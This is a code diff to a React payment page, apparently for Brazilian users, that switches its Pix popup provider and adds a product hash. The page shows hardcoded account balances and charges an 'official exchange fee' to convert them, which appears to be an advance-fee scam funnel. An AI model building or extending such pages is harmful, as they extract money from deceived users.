@@ -1,6 +1,6 @@
 import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
-import ZyroPayPixPopup from '@/components/ZyroPayPixPopup';
+import ParadisePixPopup from '@/components/ParadisePixPopup';
 import PageTransition from '@/components/PageTransition';
 import { trackViewContent } from '@/lib/tiktokPixel';
 import '../styles/app.css';
@@ -9,6 +9,7 @@ const SALDO_ATUAL = 4287.90;
 const SALDO_CONVERTIDO = 29989.50;
 const TAXA_CAMBIO = 67.90;
 const TAXA_CAMBIO_CENTAVOS = 6790;
+const PRODUCT_HASH = 'prod_0a240a2e87de20da';
 
 const formatBR = (value: number) => {
   return value
@@ -117,9 +118,10 @@ const Up5 = () => {
         </div>
 
         {showPixPopup && (
-          <ZyroPayPixPopup
+          <ParadisePixPopup
             amount={TAXA_CAMBIO_CENTAVOS}
             description="Taxa de Câmbio Oficial"
+            productHash={PRODUCT_HASH}
             onSuccess={handlePaymentSuccess}
             onClose={() => setShowPixPopup(false)}
           />
